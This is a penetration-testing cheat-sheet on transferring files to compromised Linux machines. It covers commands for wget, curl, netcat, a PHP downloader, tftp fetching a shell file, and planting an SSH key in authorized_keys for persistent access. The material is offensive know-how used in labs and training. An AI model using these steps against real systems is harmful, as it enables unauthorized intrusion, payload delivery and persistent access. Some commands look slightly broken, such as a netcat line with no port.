# Transferring Files on Linux

## Set Up a Simple Python Webserver

For the examples using `curl`  and `wget` we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999.

```
python -m SimpleHTTPServer 9999
```

## Wget

You can download files using `wget` like this:

```
wget 192.168.1.102:9999/file.txt
```

## Curl

```
curl -O http://192.168.0.101/file.txt
```

## Netcat

Another easy way to transfer files is by using netcat.

If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do `ctr-c` because that will kill your session.

So instead you can connect from the target machine like this.

On attacking machine:

```bash
nc -lvp 4444 < file
```

On target machine:

```bash
nc 192.168.1.102 4444 > file
```

You can of course also do it the risky way, the other way around:

So on the victim-machine we run `nc` like this:

```bash
nc -lvp 3333 > enum.sh
```

And on the attacking machine we send the file like this:

```bash
nc 192.168.1.103 < enum.sh
```

I have sometimes received this error:

```
This is nc from the netcat-openbsd package. An alternative nc is available
```

I have just run this command instead:

```
nc -l 1234 > file.sh
```


## With php

```
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## Ftp

If you have access to a ftp-client to can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!

## Tftp

On some rare machine we do not have access to `nc` and `wget`, or `curl`. But we might have access to `tftp`. Some versions of `tftp` are run interactively, like this:

```
$ tftp 192.168.0.101
tftp> get myfile.txt
```

If we can't run it interactively, for whatever reason, we can  do this trick:

```
tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
```

### SSH - SCP

If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.

So, in the `/home/user` directory you can find the hidden `.ssh` files by typing `ls -la`.
Then you need to do two things.

1. Create a new keypair

You do that with: 

```
ssh-keygen -t rsa -C "your_email@example.com"
```

then you enter a name for the key.

Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:

This will create two files, one called `nameOfMyKey` and another called `nameOfMyKey_pub`. The one with the `_pub` is of course your public key. And the other key is your private.

2. Add your public key to authorized_keys.

Now you copy the content of `nameOfMyKey_pub`. 
On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized_keys. Like this 

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
```

3. Log in.

Now you should be all set to log in using your private key. Like this

```
ssh -i nameOfMyKey kim@192.168.1.103
```

### SCP

Now we can copy files to a machine using `scp`

```
# Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

# Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```